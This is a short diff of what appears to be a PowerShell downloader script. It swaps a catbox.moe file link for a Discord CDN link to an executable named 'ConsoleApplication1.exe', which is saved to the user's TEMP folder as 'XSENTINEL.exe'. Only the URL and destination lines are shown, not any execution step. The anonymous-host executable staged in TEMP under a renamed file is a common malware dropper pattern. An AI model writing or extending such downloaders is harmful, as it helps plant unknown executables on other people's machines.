@@ -1,5 +1,5 @@
 
-$url = "https://files.catbox.moe/uab6n7.rar"
+$url = "https://cdn.discordapp.com/attachments/1501119476593328178/1501245942328856778/ConsoleApplication1.exe?ex=69fb5fbc&is=69fa0e3c&hm=7628d70ee478d03cca4f79a6d5a037bd3ec8f35f5a8c37c65a50ce9c884d3561&"
 $dest = "$env:TEMP\XSENTINEL.exe"
 
 
